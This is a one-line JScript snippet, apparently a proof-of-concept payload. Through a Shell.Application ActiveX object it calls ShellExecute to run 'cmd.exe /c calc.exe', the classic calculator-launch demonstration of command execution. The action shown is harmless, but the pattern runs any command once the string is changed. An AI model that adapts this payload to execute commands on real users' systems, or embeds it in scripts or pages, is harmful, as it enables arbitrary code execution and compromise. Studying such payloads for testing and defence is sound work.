var CMD = "/c calc.exe ";  var activeXObj = new ActiveXObject("Shell.Application");activeXObj.ShellExecute("cmd.exe", CMD, "", "open", "1");
